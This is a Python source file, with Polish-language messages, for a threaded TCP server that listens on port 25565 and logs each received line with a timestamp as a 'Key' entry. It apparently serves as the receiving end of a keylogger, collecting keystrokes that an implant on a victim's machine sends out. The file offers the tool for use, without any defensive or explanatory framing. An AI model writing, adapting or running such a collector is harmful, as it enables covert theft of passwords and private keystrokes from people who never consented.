import socket
import threading
import signal
import sys
import datetime

HOST = '0.0.0.0'
PORT = 25565

clients = []
clients_lock = threading.Lock()
server_socket = None
running = True

def handle_client(conn, addr):
    with conn:
        print(f"[+] Połączono z {addr[0]}:{addr[1]}")
        try:
            while running:
                data = conn.recv(1024)
                if not data:
                    break
                for line in data.decode('utf-8', errors='replace').splitlines():
                    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    print(f"[{timestamp}] Key: '{line}'")
        except Exception as e:
            print(f"[!] Błąd klienta {addr}: {e}")
        finally:
            with clients_lock:
                if conn in clients:
                    clients.remove(conn)
            print(f"[-] Rozłączono {addr[0]}:{addr[1]}")

def accept_connections():
    while running:
        try:
            conn, addr = server_socket.accept()
            with clients_lock:
                clients.append(conn)
            thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            thread.start()
        except OSError:
            break  # socket zamknięty przez sygnał zakończenia

def signal_handler(sig, frame):
    global running
    print("\n[!] Zatrzymywanie serwera...")
    running = False
    server_socket.close()
    with clients_lock:
        for client in clients:
            try:
                client.shutdown(socket.SHUT_RDWR)
                client.close()
            except:
                pass
        clients.clear()
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen()

    print(f"[+] Serwer nasłuchuje na {HOST}:{PORT}")

    accept_thread = threading.Thread(target=accept_connections)
    accept_thread.start()
    accept_thread.join()
